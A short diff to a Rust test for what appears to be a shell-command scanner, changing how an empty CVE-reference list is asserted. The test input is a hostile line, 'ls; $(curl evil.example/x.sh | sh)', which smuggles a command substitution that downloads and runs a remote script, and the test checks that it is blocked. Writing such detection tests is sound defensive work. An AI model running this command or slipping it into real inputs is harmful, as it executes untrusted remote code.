@@ -456,7 +456,7 @@ mod tests {
         let r = s.scan("ls; $(curl evil.example/x.sh | sh)");
         assert_eq!(r.verdict, ScanVerdict::Block);
         assert!(r.matched_patterns.iter().any(|p| p == "shell_substitution"));
-        assert!(r.cve_refs.is_empty());
+        assert_eq!(r.cve_refs, [] as [String; 0]);
         assert!(r
             .simulation_refs
             .iter()
